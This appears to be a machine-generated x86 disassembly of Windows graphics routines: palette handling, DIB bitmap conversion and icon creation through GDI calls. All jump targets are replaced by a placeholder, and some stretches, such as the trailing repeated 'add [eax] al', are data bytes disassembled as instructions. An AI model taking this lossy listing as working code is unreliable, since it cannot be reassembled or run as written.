dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_426328
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402d00
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_4263a0
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4263f8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028e8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4264f5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4264fc
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_426510
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_426596
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4265a8
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028e8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_4263a0
mov eax esp
call sub_426510
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_42664c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_4263a0
mov [ esp ] eax
sub_4266a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_426048
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_426028
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42684c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425eb8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426772
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_425ec8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426779
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_425dbc
sub_426779
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_426048
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_425eb8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42682c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_425ec8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426833
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_426868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4268f8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407fe0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_426bef
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4269e1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_425dbc
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4269e8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4269e8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_42685c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407fe0
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_426bcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4266a0
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407fe0
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_426bac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426bb3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_40270c
retn
call sub_425e10
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_42685c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_426868
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_426c00
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_425da4
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402d00
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_426048
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_426ce4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_426c00
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_426d50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_426c00
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_426ded
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426df4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_426e24
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402d00
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402d00
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_426e18
xor edx edx
push ebp
push sub_427012
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_426ce4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_426ce4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_426feb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407fe0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407fe0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407fe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407fe0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_426d50
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_426d50
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426ff2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40270c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_40270c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40270c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426ff2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427019
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_427020
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_427070
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4270c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_427070
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427111
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403264
mov edi eax
mov eax esi
call sub_403264
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42724b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42722e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_40810c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427235
mov al 0x1
sub_427264
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ba0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4272ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4272b3
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_4272b8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4272ec
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41ba0c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427337
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42733e
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_427368
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ ebx + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
